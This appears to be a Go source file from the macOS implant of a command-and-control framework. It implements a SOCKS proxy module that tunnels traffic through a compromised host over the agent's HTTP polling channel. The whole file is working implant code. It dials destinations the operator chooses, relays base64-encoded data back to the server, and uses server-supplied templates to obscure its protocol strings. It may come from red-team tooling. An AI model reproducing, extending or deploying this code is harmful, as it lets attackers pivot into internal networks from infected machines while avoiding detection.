// server/docker/payloads/Darwin/action_socks_http.go
// HTTP-based SOCKS handler that uses the normal polling mechanism.
// Enables SOCKS proxying through linked agents without dedicated WebSocket connections.

//go:build darwin
// +build darwin

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// Template indices - must match server's common.go
const (
	idxSocksHTTPActionConnect   = 1060
	idxSocksHTTPActionData      = 1061
	idxSocksHTTPActionClose     = 1062
	idxSocksHTTPStatusConnected = 1063
	idxSocksHTTPStatusData      = 1064
	idxSocksHTTPStatusClosed    = 1065
	idxSocksHTTPStatusError     = 1066
	idxSocksHTTPFieldSid        = 1067
	idxSocksHTTPFieldStatus     = 1068
	idxSocksHTTPFieldData       = 1069
	idxSocksHTTPFieldError      = 1070
)

// SocksHTTPCommand handles HTTP-based SOCKS proxy sessions
type SocksHTTPCommand struct {
	sessions   map[string]*TargetSession
	sessionsMu sync.RWMutex
	running    bool
	ctx        *CommandContext
	// Pending responses to be included in next POST
	pendingResponses []*SocksHTTPResponse
	pendingMu        sync.Mutex
	// Cached template strings
	template   []string
	templateMu sync.RWMutex
}

// TargetSession represents a connection to a target host
type TargetSession struct {
	ID           string
	TargetConn   net.Conn
	State        int // 0=connecting, 1=connected, 2=closed
	LastActivity time.Time
	readDone     chan struct{}
}

// SocksHTTPResponse is sent back to the server
type SocksHTTPResponse struct {
	SessionID string `json:"sid"`
	Status    string `json:"st"`  // connected, data, closed, error
	Data      string `json:"d"`   // Base64 encoded data
	Error     string `json:"err"` // Error message
}

// Global SOCKS HTTP handler instance
var socksHTTPHandler *SocksHTTPCommand
var socksHTTPOnce sync.Once

// GetSocksHTTPHandler returns the singleton SOCKS HTTP handler
func GetSocksHTTPHandler() *SocksHTTPCommand {
	socksHTTPOnce.Do(func() {
		socksHTTPHandler = &SocksHTTPCommand{
			sessions:         make(map[string]*TargetSession),
			running:          true,
			pendingResponses: make([]*SocksHTTPResponse, 0),
		}
		// Start cleanup goroutine
		go socksHTTPHandler.cleanupStaleSessions()
	})
	return socksHTTPHandler
}

func (c *SocksHTTPCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	c.ctx = ctx

	// Get the JSON data from the CurrentCommand in context
	var rawData string
	ctx.mu.RLock()
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		rawData = ctx.CurrentCommand.Data
	}
	ctx.mu.RUnlock()

	if rawData == "" {
		return CommandResult{
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Parse SOCKS HTTP command with template support
	var cmdData struct {
		Type      int      `json:"t"`
		Version   int      `json:"v"`
		Action    string   `json:"at"`
		SessionID string   `json:"sid"`
		Dest      string   `json:"dst"`
		Data      string   `json:"d"`
		Templates []string `json:"tpl"` // Template strings from server
	}

	if err := json.Unmarshal([]byte(rawData), &cmdData); err != nil {
		return CommandResult{
			Error:       err,
			ErrorString: Err(E18),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Cache template if provided (sent with first connect command)
	if len(cmdData.Templates) > 0 {
		c.templateMu.Lock()
		c.template = cmdData.Templates
		c.templateMu.Unlock()
	}

	// Get action strings from template or use fallbacks
	actConnect := c.getTpl(idxSocksHTTPActionConnect, "connect")
	actData := c.getTpl(idxSocksHTTPActionData, "data")
	actClose := c.getTpl(idxSocksHTTPActionClose, "close")

	switch cmdData.Action {
	case actConnect:
		return c.handleConnect(cmdData.SessionID, cmdData.Dest)
	case actData:
		return c.handleData(cmdData.SessionID, cmdData.Data)
	case actClose:
		return c.handleClose(cmdData.SessionID)
	default:
		return CommandResult{
			Error:       fmt.Errorf(ErrCtx(E21, cmdData.Action)),
			ErrorString: ErrCtx(E21, cmdData.Action),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// getTpl returns template string at index, or fallback if not available
func (c *SocksHTTPCommand) getTpl(idx int, fallback string) string {
	c.templateMu.RLock()
	defer c.templateMu.RUnlock()
	if c.template != nil && idx < len(c.template) && c.template[idx] != "" {
		return c.template[idx]
	}
	return fallback
}

func (c *SocksHTTPCommand) handleConnect(sessionID, dest string) CommandResult {
	// Dial TCP to destination with timeout
	conn, err := net.DialTimeout("tcp", dest, 30*time.Second)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError, "error"),
			Error:     err.Error(),
		})
		return CommandResult{
			Output:      fmt.Sprintf("Failed to connect to %s: %v", dest, err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Create session
	session := &TargetSession{
		ID:           sessionID,
		TargetConn:   conn,
		State:        1, // connected
		LastActivity: time.Now(),
		readDone:     make(chan struct{}),
	}

	c.sessionsMu.Lock()
	c.sessions[sessionID] = session
	c.sessionsMu.Unlock()

	// Queue success response
	c.queueResponse(&SocksHTTPResponse{
		SessionID: sessionID,
		Status:    c.getTpl(idxSocksHTTPStatusConnected, "connected"),
	})

	// Start goroutine to read from target
	go c.readFromTarget(session)

	return CommandResult{
		Output:      fmt.Sprintf("Connected to %s", dest),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *SocksHTTPCommand) handleData(sessionID, data string) CommandResult {
	c.sessionsMu.RLock()
	session, exists := c.sessions[sessionID]
	c.sessionsMu.RUnlock()

	if !exists {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError, "error"),
			Error:     "session not found",
		})
		return CommandResult{
			Output:      "Session not found",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Decode data
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError, "error"),
			Error:     "failed to decode data",
		})
		return CommandResult{
			Output:      "Failed to decode data",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Update activity
	session.LastActivity = time.Now()

	// Write to target
	_, err = session.TargetConn.Write(decoded)
	if err != nil {
		c.queueResponse(&SocksHTTPResponse{
			SessionID: sessionID,
			Status:    c.getTpl(idxSocksHTTPStatusError, "error"),
			Error:     err.Error(),
		})
		c.closeSession(sessionID)
		return CommandResult{
			Output:      fmt.Sprintf("Write error: %v", err),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      fmt.Sprintf("Sent %d bytes", len(decoded)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *SocksHTTPCommand) handleClose(sessionID string) CommandResult {
	c.closeSession(sessionID)
	return CommandResult{
		Output:      "Session closed",
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

func (c *SocksHTTPCommand) readFromTarget(session *TargetSession) {
	defer func() {
		close(session.readDone)
		c.closeSession(session.ID)
	}()

	buf := make([]byte, 32*1024)
	for {
		// Set read deadline to detect stale connections
		session.TargetConn.SetReadDeadline(time.Now().Add(30 * time.Second))

		n, err := session.TargetConn.Read(buf)
		if err != nil {
			if err != io.EOF {
				// Only queue error if not a normal close
				if session.State == 1 {
					c.queueResponse(&SocksHTTPResponse{
						SessionID: session.ID,
						Status:    c.getTpl(idxSocksHTTPStatusClosed, "closed"),
					})
				}
			} else {
				c.queueResponse(&SocksHTTPResponse{
					SessionID: session.ID,
					Status:    c.getTpl(idxSocksHTTPStatusClosed, "closed"),
				})
			}
			return
		}

		if n > 0 {
			session.LastActivity = time.Now()

			// Queue data response
			c.queueResponse(&SocksHTTPResponse{
				SessionID: session.ID,
				Status:    c.getTpl(idxSocksHTTPStatusData, "data"),
				Data:      base64.StdEncoding.EncodeToString(buf[:n]),
			})
		}
	}
}

func (c *SocksHTTPCommand) closeSession(sessionID string) {
	c.sessionsMu.Lock()
	session, exists := c.sessions[sessionID]
	if exists {
		session.State = 2 // closed
		if session.TargetConn != nil {
			session.TargetConn.Close()
		}
		delete(c.sessions, sessionID)
	}
	c.sessionsMu.Unlock()
}

func (c *SocksHTTPCommand) queueResponse(resp *SocksHTTPResponse) {
	c.pendingMu.Lock()
	c.pendingResponses = append(c.pendingResponses, resp)
	c.pendingMu.Unlock()
}

// GetPendingResponses returns and clears all pending SOCKS responses
// Called by the polling mechanism to include in POST payload
func (c *SocksHTTPCommand) GetPendingResponses() []*SocksHTTPResponse {
	c.pendingMu.Lock()
	defer c.pendingMu.Unlock()

	if len(c.pendingResponses) == 0 {
		return nil
	}

	responses := c.pendingResponses
	c.pendingResponses = make([]*SocksHTTPResponse, 0)
	return responses
}

func (c *SocksHTTPCommand) cleanupStaleSessions() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		now := time.Now()
		staleTimeout := 5 * time.Minute

		c.sessionsMu.RLock()
		var staleIDs []string
		for id, session := range c.sessions {
			if now.Sub(session.LastActivity) > staleTimeout {
				staleIDs = append(staleIDs, id)
			}
		}
		c.sessionsMu.RUnlock()

		for _, id := range staleIDs {
			c.queueResponse(&SocksHTTPResponse{
				SessionID: id,
				Status:    c.getTpl(idxSocksHTTPStatusClosed, "closed"),
				Error:     "session timeout",
			})
			c.closeSession(id)
		}
	}
}

// HasPendingSocksResponses checks if there are pending SOCKS responses
func HasPendingSocksResponses() bool {
	handler := GetSocksHTTPHandler()
	handler.pendingMu.Lock()
	defer handler.pendingMu.Unlock()
	return len(handler.pendingResponses) > 0
}

// GetSocksHTTPResponses returns pending SOCKS responses for inclusion in POST
func GetSocksHTTPResponses() []map[string]interface{} {
	handler := GetSocksHTTPHandler()
	responses := handler.GetPendingResponses()
	if len(responses) == 0 {
		return nil
	}

	result := make([]map[string]interface{}, len(responses))
	for i, resp := range responses {
		result[i] = map[string]interface{}{
			"sid": resp.SessionID,
			"st":  resp.Status,
		}
		if resp.Data != "" {
			result[i]["d"] = resp.Data
		}
		if resp.Error != "" {
			result[i]["err"] = resp.Error
		}
	}
	return result
}
